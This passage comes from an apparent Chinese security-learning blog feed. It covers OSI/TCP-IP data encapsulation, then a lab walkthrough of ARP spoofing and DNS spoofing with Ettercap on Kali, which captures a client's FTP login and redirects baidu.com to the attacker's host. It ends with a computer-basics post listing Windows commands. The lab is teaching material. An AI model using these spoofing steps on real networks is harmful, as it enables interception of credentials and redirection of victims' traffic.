class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数据被封装完毕通过网络传输到接收方以后，将进入数据的解封装过程，这将是封装过程的一个逆过程</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>在物理层，首先将电信号转换成二进制数据，并将数据数据送至数据链路层</span><br><span class="line"><span class="number">2.</span>在数据链路层，查看目标MAC地址，如果吻合就“拆掉”，将剩下的数据送往上一层</span><br><span class="line"><span class="number">3.</span>在网络层，核实目标IP地址是否与自己的IP地址相同，从而确定是否送至上一层</span><br><span class="line"><span class="number">4.</span>在传输层，首先根据TCP头部判断数据送往哪个应用层协议或应用程序，将之前被分组的数据段重组，再送往上一层</span><br><span class="line"><span class="number">5.</span>在应用层，这些二进制数据将经历复杂的解码过程还原成发送者所输送的最初信息</span><br></pre></td></tr></table></figure><p><strong>》》》数据传输基本概念《《《</strong></p><ul><li><p>对于 OSI 模型而言，每一层都是通过协议数据单元来进行通信的，而对于 TCP/IP 五层模型，也可以沿用这个概念</p></li><li><p>PDU（协议数据单元）是指同层之间传递的数据单位</p></li><li><p>应用数据需要经过 TCP/IP 每一层处理之后才能传输到目的端，每一层都使用该层的协议数据单元 PDU 彼此交换信息，不同层的 PDU 中包含有不同的信息，因此 PDU 在不同层被赋予了不同的名称</p></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641821009877-48ab3553-40e2-4347-befb-2b798c79f016.png" alt="img"></p><p><strong>》》》硬件设备对应五层模型《《《</strong></p><p>设备属于哪一层要看这个设备主要工作在哪一层，有什么对应的功能…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641821153555-dd2442a2-a3f2-4745-b299-057027fc6ffe.png" alt="img"></p><p><strong>》》》层间通信协议《《《</strong></p><ul><li>发送方与接收方之间必须采用相同的协议才能建立连接，实现正常的通信</li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641821484028-605bd9f5-59d2-4767-baa4-0f9a01a6cec4.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提问:各个层的协议都有哪些？</span><br></pre></td></tr></table></figure><h1 id="三局域网络攻击实验扩展"><a class="markdownIt-Anchor" href="#三局域网络攻击实验扩展">#</a> 三：局域网络攻击实验【扩展】</h1><p><strong>》》》ARP 欺骗攻击《《《</strong></p><p>简介：ARP（Address Resolution Protocol）是地址解析协议，是一种将 IP 地址转化成物理地址的协议。从 IP 地址到物理地址的映射有两种方式：表格方式和非表格方式。ARP 具体说来就是将网络层（也就是相当于 OSI 的第三层）地址解析为数据链路层（也就是相当于 OSI 的第二层）的物理地址 (注：此处物理地址并不一定指 MAC 地址)。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理：主机A要向主机B发送报文，会查询A本地的ARP缓存表，找到B的IP地址对应的MAC地址后，就会进行数据传输。如果未找到，则A广播一个ARP请求报文（携带主机A的IP地址Ia——物理地址Pa），请求IP地址为Ib的主机B回答物理地址Pb。网上所有主机包括B都收到ARP请求，但只有主机B识别自己的IP地址，于是向A主机发回一个ARP响应报文。其中就包含有B的MAC地址，A接收到B的应答后，就会更新本地的ARP缓存。接着使用这个MAC地址发送数据（由网卡附加MAC地址）。因此，本地高速缓存的这个ARP表是本地网络流通的基础，而且这个缓存是动态的。</span><br></pre></td></tr></table></figure><p>实验网络拓扑：</p><table><thead><tr><th>主机标识</th><th>安装服务</th><th>操作系统</th><th>IP 地址</th></tr></thead><tbody><tr><td>Clinet IP</td><td>None</td><td>Windows 10</td><td>192.168.1.106</td></tr><tr><td>Kali IP</td><td>None</td><td>Kali Linux</td><td>192.168.1.104</td></tr><tr><td>Server IP</td><td>FTP Server</td><td>Windows server 2016</td><td>192.168.1.98</td></tr></tbody></table><p>步骤一：在各个主机之间进行 Ping 测试，并在 Kali 上启动网卡位混杂模式…</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">1</span> &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>步骤二：在 KALI 上输入 <code>Ettercap -G</code>  命令启动 Ettercap 图形化界面… 并进行以下操作…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641898634363-a778df2e-fc03-48f0-9140-1252820e876c.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641898677187-d9ddc981-16f0-4b39-8557-25162077abfc.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641980212733-a0d0cd5d-26ef-4cec-803a-b879714062cd.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641980247132-968383b8-4339-4b78-86db-6206bcfa2be7.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641980272363-075883c2-6a9a-4bbf-8475-e9fb1cfb7556.png" alt="img"></p><p>步骤三：在 Client 上输入以下地址进行访问，并输入 FTP 服务器账号密码进行访问…</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp:<span class="comment">//192.168.1.98/</span></span><br></pre></td></tr></table></figure><p>步骤四：回到 Kali 的 Ettercap 查看捕获到的信息…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641898515785-2cdf0138-381f-49bb-bcb9-ba2040fa7eb6.png" alt="img"></p><p><strong>》》》DNS 欺骗攻击《《《</strong></p><p>步骤一：进行欺骗之前需要对 ettercap 的 dns 文件进行编辑并添加一下内容… 注意添加的内容之前能有 &quot;#&quot; 号键…</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install leafpad</span><br><span class="line">leafpad /etc/ettercap/etter.dns</span><br><span class="line">添加以下内容：</span><br><span class="line">baidu.com    A      Kali IP地址</span><br><span class="line">*.baidu.com    A      Kali IP地址</span><br><span class="line">这样的目的是为了，让客户端访问baidu.com时跳转访问攻击者的web服务</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641980949136-8d38ae1b-67ea-4b4e-a426-b21c1204e802.png" alt="img"></p><p>步骤二：前面的步骤与 ARP 欺骗一致，只需要在开始欺骗之前，双击添加一个插件；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641981354751-b21119ce-a158-4f62-996c-2c3f6c709cfd.png" alt="img"></p><p>步骤三：在受害者主机进行 ping 命令测试，查看 DNS 是否欺骗成功…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1641980701483-03d45356-1ca6-4ad6-bece-71d5070c3c76.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;计算机网络&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#计算机网络&quot;&gt;#&lt;/a&gt; 计算机网络&lt;/h1&gt;
&lt;p&gt;两个基本的漏洞&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl</summary>
      
    
    
    
    <category term="信息安全—网络渗透" scheme="https://sun-spots.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E2%80%94%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>计算机的基本概念</title>
    <link href="https://sun-spots.github.io/2022/01/10/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/1.1%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"/>
    <id>https://sun-spots.github.io/2022/01/10/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/1.1%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</id>
    <published>2022-01-10T12:05:00.000Z</published>
    <updated>2022-01-16T08:32:31.583Z</updated>
    
    <content type="html"><![CDATA[<h1 id="计算机组成"><a class="markdownIt-Anchor" href="#计算机组成">#</a> 计算机组成</h1><h2 id="课堂导学"><a class="markdownIt-Anchor" href="#课堂导学">#</a> 课堂导学：</h2><p>一个完整的计算机包括两部分：（一）：计算机硬件：中央处理器、内存、存储器、输入设备、输出设备</p><p>​  （二）：计算机软件：系统软件、应用程序软件</p><h2 id="1计算机的组成"><a class="markdownIt-Anchor" href="#1计算机的组成">#</a> 1：计算机的组成</h2><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624895370503-aa65f8a4-261f-4555-afa5-53f3cbd92b23.png" alt="img"></p><h3 id="11硬件系统"><a class="markdownIt-Anchor" href="#11硬件系统">#</a> 1.1：硬件系统</h3><p>在传统的理念中，计算机硬件是由运算器，存储器，控制器和输入输出设备这几个基本部分组成的，计算机是一个能够执行操作命令的设备，指令是构成计算机软件的基本元素。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623047342895-59baf7c5-8c8b-473b-bf36-0f679d50faeb.png" alt="img"></p><h4 id="i中央处理器"><a class="markdownIt-Anchor" href="#i中央处理器">#</a> i：中央处理器</h4><p>​       运算器、控制器统称中央处理器（cpu）：负责数据的算数运算和逻辑运算，及数据的加工处理，是整个计算机的中枢神经，分析程序的可控制信息，并根据程序要求进行控制，协调计算机各部分组件工作及内存与外设的访问等。</p><h4 id="ii存储器"><a class="markdownIt-Anchor" href="#ii存储器">#</a> ii：存储器</h4><p>实现记忆功能的部件，用来存储程序、数据和各种信号、命令等信息、并在需要时提供这些信息。内存（rom 只读存储器；ram 随机存储器；断电就会消失）；外存（硬盘、软盘、光盘）。</p><h4 id="iii输入输出设备"><a class="markdownIt-Anchor" href="#iii输入输出设备">#</a> iii：输入输出设备</h4><p>计算机从输入设备获得外部的信息。输入设备将外部信息以一定的数据格式送入系统，并由输出设备输出。如：键盘输入一首歌曲名称，将这一数据送入系统，音响播放。</p><h3 id="12软件系统"><a class="markdownIt-Anchor" href="#12软件系统">#</a> 1.2：软件系统</h3><p>操作系统主要作用是管理好硬件设备。</p><h4 id="i桌面操作系统"><a class="markdownIt-Anchor" href="#i桌面操作系统">#</a> i：桌面操作系统</h4><p>window 系列：用户群体大</p><p>macOS：适合于开发人员</p><p>linux：应用软件少</p><h4 id="ii服务器操作系统"><a class="markdownIt-Anchor" href="#ii服务器操作系统">#</a> ii：服务器操作系统</h4><p>linux：安全、稳定、免费；占有率高</p><p>windows server：收费；占有率低</p><h4 id="iii嵌入式操作系统"><a class="markdownIt-Anchor" href="#iii嵌入式操作系统">#</a> iii：嵌入式操作系统</h4><p>linux：体积小</p><p>主要运用：机顶盒、网络电话、手机等等</p><h4 id="iiii移动设备操作系统"><a class="markdownIt-Anchor" href="#iiii移动设备操作系统">#</a> iiii：移动设备操作系统</h4><p>IOS</p><p>Android（基于 linux）</p><h2 id="2进制的转换"><a class="markdownIt-Anchor" href="#2进制的转换">#</a> 2：进制的转换</h2><h3 id="21什么是进制"><a class="markdownIt-Anchor" href="#21什么是进制">#</a> 2.1：什么是进制？</h3><p>进制也就是进位计数制，是人为定义的带进位的计数方法（有不带进位的计数方法，比如原始的结绳计数法，唱票时常用的 “正” 字计数法）。 对于任何一种进制 —X 进制，就表示每一位置上的数运算时都是逢 X 进一位。 十进制是逢十进一，十六进制是逢十六进一，二进制就是逢二进一，以此类推，x 进制就是逢 x 进位。</p><h3 id="22常见的进制对照表"><a class="markdownIt-Anchor" href="#22常见的进制对照表">#</a> 2.2：常见的进制对照表</h3><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623047803558-6a68bb4b-82ee-4794-95ed-3e69b91c0487.png" alt="img"></p><h3 id="23二进制转十进制"><a class="markdownIt-Anchor" href="#23二进制转十进制">#</a> 2.3：二进制转十进制</h3><p>二进制转为十进制要从右到左用二进制的每个数去乘以 2 的相应次方，小数点后则是从左往右。</p><p>如果首位是 0 就表示正整数，如果首位是 1 则表示负整数，正整数可以直接换算，负整数则需要先取反再换算。</p><p>因为计算机内部表示数的字节单位是定长的。如 8 位、16 位、32 位。所以位数不够时，高位补零。</p><ul><li>如要想二进制 00101010 转为十进制，因为以 0 开头，所以这是正整数，计算如下所示：<br><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623048789217-1a3af789-4173-47b9-a04c-543baa032f56.png" alt="img"></li></ul><h3 id="24十进制转二进制"><a class="markdownIt-Anchor" href="#24十进制转二进制">#</a> 2.4：十进制转二进制</h3><p>十进制转二进制分为整数转二进制，和小数转二进制</p><h3 id="25整数转二进制"><a class="markdownIt-Anchor" href="#25整数转二进制">#</a> 2.5：整数转二进制</h3><p>采用 &quot;除 2 取余，逆序排列&quot; 法：</p><p>1. 首先用 2 整除一个十进制整数，得到一个商和余数<br> 2. 然后再用 2 去除得到的商，又会得到一个商和余数<br> 3. 重复操作，一直到商为小于 1 时为止<br> 4. 然后将得到的所有余数全部排列起来，再将它反过来（逆序排列），切记一定要反过来！</p><p>假设我们现在需要将 42 转为二进制，那我们怎么做呢，如下图所示：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623048389394-56e294ca-d4f6-40ea-9c2e-453153326840.png" alt="img"></p><h3 id="26小数转二进制"><a class="markdownIt-Anchor" href="#26小数转二进制">#</a> 2.6：小数转二进制</h3><p>采用 &quot;乘 2 取整，顺序排列&quot; 法：</p><p>1. 用 2 乘十进制小数，可以得到积，将积的整数部分取出<br> 2. 再用 2 乘余下的小数部分，又得到一个积，再将积的整数部分取出<br> 3. 重复操作，直到积中的小数部分为零，此时 0 或 1 为二进制的最后一位，或者达到所要求的精度为止</p><p>例如将 0.125 转换为二进制：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623048607913-dd5294a7-1f2f-4e33-ae71-e360bceb0586.png" alt="img"></p><p>如果小数的整数部分有大于 0 的整数时，将整数部分和小数部分先单独转为二进制，再合在一起就可以了，例如：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623048709045-4ab2aaa9-9b74-469c-a689-966b6f735182.png" alt="img"></p><h3 id="27十六进制转十进制"><a class="markdownIt-Anchor" href="#27十六进制转十进制">#</a> 2.7：十六进制转十进制</h3><p>1、首先明白 16 进制数（从右到左数是第 0 位，第 1 位，第 2 位……）的第 0 位的权值为 16 的 0 次方，第 1 位的权值为 16 的 1 次方，第 2 位的权值为 16 的 2 次方，依次这样排列下去。</p><p>2、明白 ABCDEF 表示的二进制数字分别是 10，11，12，13，14，15。</p><p>3、十六进制转换成十进制的公式是：要从右到左用二进制的每个数去乘以 16 的相应次方，然后这些数字相加就是了。</p><p>例 1：2AF5 换算成 10 进制:</p><p>第 0 位： 5 * 16^0 = 5</p><p>第 1 位： F * 16^1 =15*16^1= 240</p><p>第 2 位： A * 16^2= 10* 16^2=2560</p><p>第 3 位： 2 * 16^3 = 8192</p><p>结果就是：5 * 16^0 + 15 * 16^1 + 10 * 16^2 + 2 * 16^3 = 10997</p><p>例 2：CE 换算成 10 进制:</p><p>第 0 位：E*16<sup>0=14*16</sup>0=14</p><p>第 1 位：C*16<sup>1=12*16</sup>1=192</p><p>结果就是：14*16<sup>0+12*16</sup>1=206</p><h3 id="28拓展资料"><a class="markdownIt-Anchor" href="#28拓展资料">#</a> 2.8: 拓展资料</h3><p>16 进制即逢 16 进 1，每一位上可以是从小到大为 0、1、2、3、4、5、6、7、8、9、A、B、C、D、E、F 共 16 个大小不同的数。16 进制转换即 16 进制与其他不同进制之间的换算转换。</p><h2 id="3服务-协议与端口"><a class="markdownIt-Anchor" href="#3服务-协议与端口">#</a> 3：服务、协议与端口</h2><h3 id="31常见的计算机服务"><a class="markdownIt-Anchor" href="#31常见的计算机服务">#</a> 3.1：常见的计算机服务</h3><p>计算机中的服务是一种应用程序类型，在后台运行。服务应用程序通常可以在本地和通过网络为用户提供一些功能，例如客户端 / 服务器应用程序、Web 服务器、数据库服务器以及其他基于服务器的应用程序。</p><h3 id="32常见的计算机服务"><a class="markdownIt-Anchor" href="#32常见的计算机服务">#</a> 3.2：常见的计算机服务</h3><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623049782379-e00f6d3d-e5fa-40b5-8f0a-e21bf71ca778.png" alt="img"></p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/e4f2ea08d56e8103.png" alt=""></p><h3 id="33协议"><a class="markdownIt-Anchor" href="#33协议">#</a> 3.3：协议</h3><p>服务对应端口，而端口走协议，比如生活中的银行，提供取款、存款、贷款等服务，去窗口办理业务，但是客户是个歪果仁，此时怎么办呢？银行工作人员必须会英语或者他必须会中文，才能顺利的办理业务，那么此时的银行的业务即可理解为计算机的服务，窗口便是端口，那么协议呢？那就是我们交流所用的同一种语言了。</p><h2 id="4dos命令"><a class="markdownIt-Anchor" href="#4dos命令">#</a> 4：DOS 命令</h2><p><strong>&quot;运行&quot; 命令</strong></p><ul><li><ul><li><strong>gpedit.msc</strong>      // 组策略</li><li><strong>lusrmgr.msc</strong>     // 本地用户和组</li></ul></li><li><ul><li><strong>services.msc</strong>     // 本地服务设置</li><li><strong>taskmgr</strong>          // 任务管理器</li></ul></li><li><ul><li><strong>mmc</strong>              // 控制台</li><li><strong>regedit</strong>          // 注册表编辑器</li></ul></li><li><ul><li><strong>msconfig</strong>       // 系统配置（引导。服务。启动。工具）</li><li><strong>mstsc</strong>            // 远程桌面</li></ul></li><li><ul><li><strong>mspaint</strong>           // 画图</li><li><strong>write</strong>             // 写字板</li></ul></li><li><ul><li><strong>notepad</strong>         // 打开记事本</li><li><strong>calc</strong>                // 打开计算器</li></ul></li><li><ul><li><strong>explorer</strong>         // 打开文件资源管理器</li><li><strong>logoff</strong>           // 注销命令</li></ul></li><li><ul><li><strong>shutdown</strong>     //60 秒倒计时关机</li></ul></li></ul><h3 id="41如何打开控制台窗口"><a class="markdownIt-Anchor" href="#41如何打开控制台窗口">#</a> 4.1：如何打开控制台窗口</h3><p>Win+r 打开运行，输入 Cmd 点击确定可以打开命令窗口。</p><h3 id="42常见的dos命令"><a class="markdownIt-Anchor" href="#42常见的dos命令">#</a> 4.2：常见的 DOS 命令</h3><ol><li><p><strong>ipconfig /all</strong>             // 查看网络详细信息</p></li><li><p>Ipconfig /release 命令释放指定适配器的 IP 地址</p></li><li><p>Ipconfig /renew 命令更新指定适配器的 IP 地址</p></li><li><p><strong>set</strong>                           // 显示当前所有环境变量</p></li></ol><ul><li><ul><li><strong>dir</strong>                           // 列出当前目录的文件</li></ul></li><li><ul><li><ul><li><strong>dir  /a</strong>               // 列出所有文件包括隐藏文件</li></ul></li></ul></li><li><ul><li><strong>whoami</strong>                    // 查看当前计算机名及当前用户名</li><li><strong>tasklist</strong>                      // 列出当前所有服务的详细信息</li></ul></li><li><ul><li><ul><li><strong>tasklist -svc</strong>       // 列出当前所有服务对应的 PID</li></ul></li></ul></li><li><ul><li><strong>systeminfo</strong>               // 查看计算机详细信息</li><li><strong>tree</strong>                         // 以树状的形式显示文件及文件夹</li></ul></li><li><ul><li><strong>type 1.txt</strong>                 // 查看文件内容</li><li><strong>start</strong>                        // 重新打开一个 cmd 窗口</li></ul></li><li><ul><li><ul><li><strong>start 1.txt</strong>         <a href="//xn--1-xv6a93aw76bt2dz2i7n0aog5b.xn--txt-wu9dq54h">// 使用记事本打开 1.txt 文件</a></li></ul></li></ul></li><li><ul><li><strong>more 1.txt</strong>               // 分屏查看文本内容</li><li><strong>arp -a</strong>                     // 查看网内主机</li></ul></li><li><ul><li><strong>net user</strong>                 // 查看当前计算机所有用户</li></ul></li><li><ul><li><ul><li><strong>net user as-before</strong>    // 查看指定用户属性</li></ul></li></ul></li><li><ul><li><strong>net start</strong>                   // 查看启动的 windows 服务</li></ul></li><li><ul><li><ul><li><strong>net start 迅雷下载基础服务（用于快速申请磁盘空间及接管浏览器下载请求）</strong></li><li>**net stop 迅雷下载基础服务（用于快速申请磁盘空间及接管浏览器下载请求）**PS:(需要管理员权限)</li></ul></li></ul></li><li><ul><li><strong>net view</strong>                   // 显示域列表、计算机列表或指定计算机的共享资源列表</li></ul></li><li><ul><li><ul><li><strong>net view ip</strong>      // 显示指定的 ip 的共享资源列表</li></ul></li></ul></li><li><ul><li><strong>net config</strong>               // 用于显示服务器的打开文件数量和空闲回话时间及用户登录数量</li></ul></li><li><ul><li><ul><li><strong>net config Server</strong>      // 查看服务器的     PS:(运行需要管理员权限)</li><li><strong>net config Workstation</strong>   // 查看当前工作站的    PS:(运行需要管理员权限)</li></ul></li></ul></li><li><ul><li><strong>net share</strong>               // 查看本地开启的共享文件</li><li><strong>netstat -an</strong>            // 查看开启的端口信息</li></ul></li><li><ul><li><ul><li><strong>netstat -ano</strong>   // 查看带有 PID 的端口信息</li></ul></li></ul></li><li><ul><li><strong>nslookup</strong>              // 查询 DNS 的记录，查询域名解析，用来诊断网络问题</li><li><strong>tracert <span class="exturl" data-url="aHR0cDovL3d3dy5iYWlkdS5jb20=">www.baidu.com</span></strong>       // 路由追踪</li></ul></li><li><ul><li><strong>ping</strong>                    // 测试网络连通</li><li><strong>cd</strong>                       // 切换目录</li></ul></li><li><ul><li><ul><li><strong>cd .</strong>             // 还在当前目录</li><li><strong>cd …</strong>            // 切换到上层目录</li></ul></li></ul></li><li><ul><li><ul><li>*<em>cd *</em>             // 切换至根目录</li><li><strong>cd . &gt; 1.txt</strong>    // 创建文件</li></ul></li></ul></li><li><ul><li><strong>d：</strong>            // 直接跳转至 d 盘根目录</li><li><strong>md test</strong>           // 创建 test 目录</li></ul></li><li><ul><li><strong>rd test</strong>             // 删除 test 目录</li></ul></li><li><ul><li><ul><li><strong>rd /s test</strong>         // 删除目录需要确定</li></ul></li></ul></li><li><ul><li><strong>copy 1.txt 2.txt</strong>          <a href="//xn--1-lf8a13s.xn--txt2-dx8fl9ag06bzr4c.txt">// 复制 1.txt 的内容到 2.txt</a>，如果 2.txt 存在内容会提示你是否覆盖</li><li><strong>del 2.txt</strong>            // 删除文件</li></ul></li><li><ul><li><ul><li><strong>del -f 1.txt</strong>            // 强制删除</li></ul></li></ul></li><li><ul><li><strong>move 1.txt test</strong>        <a href="//xn--1-4i2b.xn--txttest-kg5kf4qyxbyxbsy0c7r0bh30d">// 将 1.txt 移动到 test 文件夹内</a></li><li><strong>move  1.txt 2.txt</strong>        <a href="//xn--1-4i2b.xn--txt2-xh5fn22anwa9819a.txt">// 将 1.txt 重命名为 2.txt</a></li></ul></li><li><ul><li><strong>ren 1.txt 2.txt</strong>             // 重命名</li><li><strong>shutdown -s</strong>          // 一分钟后关机</li></ul></li><li><ul><li><ul><li><strong>shutdown -s -t 100 -c “bye”</strong>     // 100 秒后关机并弹出 bye 消息</li><li><strong>shutdown -a</strong>     // 取消计划的关机任务</li></ul></li></ul></li><li><ul><li><strong>net use K: \ip\c$</strong>       // 映射目标 ip 的 c 盘到本地 k 盘</li><li><strong>net use k: \ip\c$ \del</strong>       // 删除映射的 k 盘</li></ul></li><li><ul><li><strong>taskkill  /f /im xx.exe</strong>      // 强制终止某进程</li><li><strong>findstr “Hello”aa.txt</strong>    <a href="//xn--aa-rl8c.xn--txthello-nd0mtb06mt40e5zb204b5mkph1g">// 在 aa.txt 文件中寻找字符串 hello</a></li></ul></li><li><ul><li><strong>echo hello » pass.txt</strong>      <a href="//xn--hellopass-9y4op2b060ejy3m.xn--txt-x68dy9al71g">// 将 hello 追加到 pass.txt 文件中</a> (一个&gt; 直接覆盖原内容)</li><li><strong>color 02</strong>     // 把 cmd 中的字改为绿色字体</li></ul></li><li><ul><li><strong>cls</strong>     // 清屏</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;计算机组成&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#计算机组成&quot;&gt;#&lt;/a&gt; 计算机组成&lt;/h1&gt;
&lt;h2 id=&quot;课堂导学&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#课堂导学&quot;&gt;#&lt;/a&gt; 课堂导</summary>
      
    
    
    
    <category term="信息安全—网络渗透" scheme="https://sun-spots.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E2%80%94%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
</feed>
